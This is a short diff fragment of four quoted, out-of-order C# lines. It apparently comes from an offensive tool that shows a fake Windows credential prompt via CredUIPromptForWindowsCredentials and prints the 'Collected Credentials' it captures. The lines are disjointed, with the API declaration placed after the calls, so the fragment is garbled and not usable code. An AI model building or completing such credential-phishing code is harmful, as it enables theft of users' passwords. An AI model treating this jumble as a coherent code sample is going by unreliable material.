@@ -1,0 +1,4 @@
+"                Console.WriteLine(""[+] Collected Credentials:\r\n"" +"
+"            credui.pszMessageText = ""Please enter the credentials for "" + username;"
+"            int result = CredUIPromptForWindowsCredentials(ref credui,"
+"        private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,"
